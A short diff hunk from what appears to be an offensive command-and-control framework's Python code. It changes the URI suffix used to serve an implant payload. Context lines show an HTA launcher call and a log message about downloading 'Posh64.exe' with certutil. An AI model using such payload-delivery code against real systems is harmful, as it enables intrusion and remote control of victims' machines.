@@ -367,7 +367,7 @@ ao.run('%s', 0);window.close();
     output_file.close()
 
     try:
-        uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_ex"
+        uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_ex6"
         filename = randomuri()
         self.QuickstartLog( ""+Colours.END )
         self.QuickstartLog( "Download Posh64.exe using certutil:"+Colours.GREEN )
